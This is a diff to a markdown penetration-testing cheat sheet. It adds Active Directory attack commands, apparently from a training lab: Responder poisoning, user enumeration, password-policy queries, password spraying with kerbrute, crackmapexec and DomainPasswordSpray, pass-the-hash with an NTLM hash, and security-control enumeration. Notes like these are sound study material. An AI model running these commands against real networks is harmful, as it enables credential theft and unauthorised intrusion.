@@ -12,6 +12,7 @@
         - [IMAP/ POP3](#imap-pop3-ports-110-143-993-995)
         - [MSSQL](#mssql-port-1433)
         - [MySQL](#mysql-port-3306)
+- [Active Directory](#active-directory)
 
 ## Recon
 
@@ -122,4 +123,91 @@ Linux
 
 ## Enumeration
 
-### 
+### Linx
+
+### Windows
+
+## Exploit
+
+### Linx
+
+### Windows
+
+
+## Active Directory
+### Enumeration
+#### Passive
+```c
+sudo tcpdump -i ens224
+
+sudo responder -I ens224 -A
+```
+
+#### Active
+```c
+# Ping Sweep
+    - Linux
+        for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+        fping -asgq 172.16.5.0/23
+
+    - Windows
+        CMD: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+        PS1: 1..254 | % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($*) -quiet)"}
+
+
+# User Enumeration
+    - Linux
+        kerbrute userenum -d DOMAIN_NAME --dc DC_IP username_wordlist.txt -o valid_ad_users
+        enum4linux -U IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+        rpcclient -U "" -N IP
+        crackmapexec smb IP --users
+
+    # Need valid credentials
+    - Linux
+        sudo crackmapexec smb CD_IP -u valid_user -p valid_pass (--users or --groups or --loggedon-users or --shares or -M spider_plus --share 'sharename')
+        python3 windapsearch.py --dc-ip DC_IP -u USERNAME@DOMAIN_NAME -p Password --da
+        python3 windapsearch.py --dc-ip DC_IP -u USERNAME@DOMAIN_NAME -p Password -PU
+    - Windows
+
+
+# Get Password Policy
+    - Linux
+        crackmapexec smb IP -u username -p password --pass-pol
+        rpcclient -U "" -N IP  ->  querydominfo
+        ldapsearch -h IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+        enum4linux -P IP
+        enum4linux-ng -P IP -oA file.txt
+    - Windows
+        CMD
+            net use \\host\ipc$ "" /u:""
+            net accounts
+        PS1
+            import-module .\PowerView.ps1  ->  Get-DomainPolicy
+
+
+# Password Spray
+    - Linux
+        for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" IP | grep Authority; done
+        kerbrute passwordspray -d DOMAIN_NAME --dc IP valid_users.txt Password
+        sudo crackmapexec smb IP -u valid_users.txt -p Password123 | grep +
+        sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+    - Windows
+        Import-Module .\DomainPasswordSpray.ps1
+        Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+
+# Enumerate Secruity Controls
+    - Windows
+        Get-MpComputerStatus
+        Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+        $ExecutionContext.SessionState.LanguageMode
+        Find-LAPSDelegatedGroups
+        Find-AdmPwdExtendedRights
+        Get-LAPSComputers
+```
+
+
+
+### Exploit
+```c
+```
